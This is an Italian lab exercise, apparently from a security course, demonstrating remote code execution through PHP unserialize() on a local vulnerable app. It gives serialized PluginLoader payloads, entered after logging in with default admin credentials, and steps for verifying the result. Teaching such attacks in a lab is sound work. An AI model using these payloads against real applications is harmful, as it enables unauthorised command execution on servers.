🚀 Esercizio 2: Exploit in Azione

Inseriamo il payload e otteniamo RCE
📝 Passaggi dell'Attacco
Step 1: Accedi come admin: http://localhost:8008 (admin/password)

Step 2: Vai su "Plugin" → seleziona un plugin → "Configura"

Step 3: Nel campo "Configurazione (formato serializzato PHP)", inserisci:
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}

Step 4: Clicca "Salva Configurazione"

Risultato: Il comando viene eseguito durante unserialize()!
✅ Verifica Metodo 1: Web
Scrivi output in directory web-accessible:
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:32:"whoami > /var/www/html/whoami.txt";}

Poi visita:
http://localhost:8008/whoami.txt
✅ Verifica Metodo 2: Docker
Accedi al container:
docker exec -it <container_id> bash # Verifica file creato cat /tmp/test.txt # Output: uid=33(www-data)...
💡 Nota
Dopo aver salvato la configurazione, se il comando è stato eseguito correttamente, la pagina mostrerà un alert giallo con l'output del comando!
